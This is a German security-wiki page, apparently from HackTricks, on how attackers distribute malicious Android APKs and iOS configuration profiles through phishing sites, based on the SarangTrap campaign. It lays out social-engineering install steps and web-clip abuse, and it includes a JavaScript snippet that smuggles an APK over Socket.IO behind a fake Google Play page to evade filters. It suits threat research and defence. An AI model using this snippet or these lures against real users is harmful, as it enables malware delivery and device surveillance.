# Mobile-Phishing & Verteilung bösartiger Apps (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite behandelt Techniken, die von Threat Actors verwendet werden, um **bösartige Android-APKs** und **mobile Konfigurationsprofile für iOS** über Phishing (SEO, Social Engineering, Fake Stores, Dating-Apps usw.) zu verbreiten.
> Das Material basiert auf der von Zimperium zLabs (2025) aufgedeckten SarangTrap-Kampagne und weiterer öffentlicher Forschung.<sup>[[1]](#references)</sup>

## Angriffsablauf

1. **SEO-/Phishing-Infrastruktur**
* Dutzende ähnlich aussehende Domains registrieren (Dating, Cloud Share, Fahrdienste …).
– Keywords in der lokalen Sprache und Emojis im `<title>`-Element verwenden, um in Google ein höheres Ranking zu erzielen.
– Android-Installationsanweisungen (`.apk`) und iOS-Installationsanweisungen auf derselben Landingpage hosten.
2. **Download der ersten Stufe**
* Android: direkter Link zu einer *unsignierten* oder aus einem „Third-Party Store“ stammenden APK.
* iOS: `itms-services://`- oder einfacher HTTPS-Link zu einem bösartigen **mobileconfig**-Profil (siehe unten).
3. **Verhalten nach der Android-Installation**
* C2-gesteuerte Ausführung, Missbrauch von Berechtigungen, Dropper-Umgehungen, Datensammlung im Hintergrund und weitere Post-Install-Malware-Verhaltensweisen werden auf der unten genannten dedizierten Seite zu Android Malware Post-Exploitation behandelt.
4. **iOS-Bereitstellungstechnik**
* Ein einzelnes **mobiles Konfigurationsprofil** kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` usw. anfordern, um das Gerät in eine „MDM“-ähnliche Überwachung einzubinden.
* Anweisungen für Social Engineering:
1. Einstellungen öffnen ➜ *Profil geladen*.
2. Dreimal auf *Installieren* tippen (Screenshots auf der Phishing-Seite).
3. Dem unsignierten Profil vertrauen ➜ der Angreifer erhält ohne App-Store-Prüfung die Berechtigungen für *Kontakte* und *Fotos*.
5. **iOS Web-Clip-Payload (Phishing-App-Symbol)**
* `com.apple.webClip.managed`-Payloads können **eine Phishing-URL mit einem gebrandeten Symbol/Label auf dem Home-Bildschirm anheften**.
* Web Clips können **im Vollbildmodus** ausgeführt werden (blenden die Browser-Benutzeroberfläche aus) und als **nicht entfernbar** markiert werden, sodass das Opfer zum Entfernen des Symbols das Profil löschen muss.<sup>[[3]](#references)</sup>
6. **Netzwerkschicht**
* Einfaches HTTP, häufig auf Port 80 mit einem HOST-Header wie `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht zu erkennen).

## Android Malware Post-Exploitation

Für Android-Malware-Tricks nach der Installation wie C2, Accessibility-Missbrauch, Overlays, ATS-Automatisierung, gestaffeltes DEX-Laden, Premium-SMS und Persistenz siehe:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK-Schmuggel über Socket.IO/WebSocket + Fake-Google-Play-Seiten

Angreifer ersetzen statische APK-Links zunehmend durch einen in Ködern mit Google-Play-ähnlichem Erscheinungsbild eingebetteten Socket.IO/WebSocket-Kanal. Dadurch wird die Payload-URL verborgen, die Umgehung von URL-/Erweiterungsfiltern ermöglicht und eine realistische Installations-UX beibehalten.<sup>[[2]](#references)[[4]](#references)</sup>

Typischer, in freier Wildbahn beobachteter Client-Ablauf:

<details>
<summary>Socket.IO-Fake-Play-Downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Warum es einfache Kontrollen umgeht:
- Es wird keine statische APK-URL offengelegt; die Payload wird im Speicher aus WebSocket-Frames rekonstruiert.
- URL-/MIME-/Erweiterungsfilter, die direkte `.apk`-Antworten blockieren, übersehen möglicherweise Binärdaten, die über WebSockets/Socket.IO getunnelt werden.
- Crawler und URL-Sandboxen, die keine WebSockets ausführen, rufen die Payload nicht ab.

Siehe auch WebSocket-Tradecraft und -Tools:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Referenzen

- [1] [Die dunkle Seite der Romantik: SarangTrap-Erpressungskampagne](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Einstellungen der Web-Clips-Payload für Apple-Geräte](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banking-Trojaner mit Ziel auf indonesische und vietnamesische Android-Nutzer](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)

{{#include ../../banners/hacktricks-training.md}}
